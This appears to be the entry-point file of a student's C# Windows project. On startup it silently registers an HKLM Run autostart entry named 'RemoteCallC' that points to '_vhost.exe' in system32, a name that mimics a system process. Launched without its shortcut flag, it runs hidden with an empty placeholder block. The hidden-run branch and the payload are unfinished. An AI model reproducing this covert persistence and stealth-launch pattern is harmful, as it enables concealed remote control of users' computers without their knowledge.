using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;


namespace 畢業作業
{
    static class Program
    {
        /// <summary>
        /// 應用程式的主要進入點。
        /// </summary>
        [STAThread]
    static  void Main()
        {
            //自動開啟程式
            RegistryKey rk1 = Registry.LocalMachine;
            RegistryKey rk2 = rk1.CreateSubKey("SOFTWARE");
            RegistryKey rk3 = rk2.CreateSubKey("Microsoft");
            RegistryKey rk4 = rk3.CreateSubKey("Windows");
            RegistryKey rk5 = rk4.CreateSubKey("CurrentVersion");
            RegistryKey rk6 = rk5.CreateSubKey("Run");
            rk6.SetValue("RemoteCallC", "c:/windows/system32/_vhost.exe");
            rk6.Close();


            //使用者開啟是由捷徑開始，捷徑會把ddd地方的txt改成1 程式結束後會改回0


            StreamReader sr = new StreamReader("Ddd");
            string s = sr.ReadToEnd(); 
            sr.Close();
            if (s == "1")
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1());
            }
            else
            {
               
                Process[] p = new Process[10];
                WebBrowser web = new WebBrowser (); //documentCompleted
                


















                //記得改回來
                StreamWriter sw = new StreamWriter("ddd");
                sw .Write ("0");
                sw.Flush();
                sw.Close();
            }

        }
  
    }
}
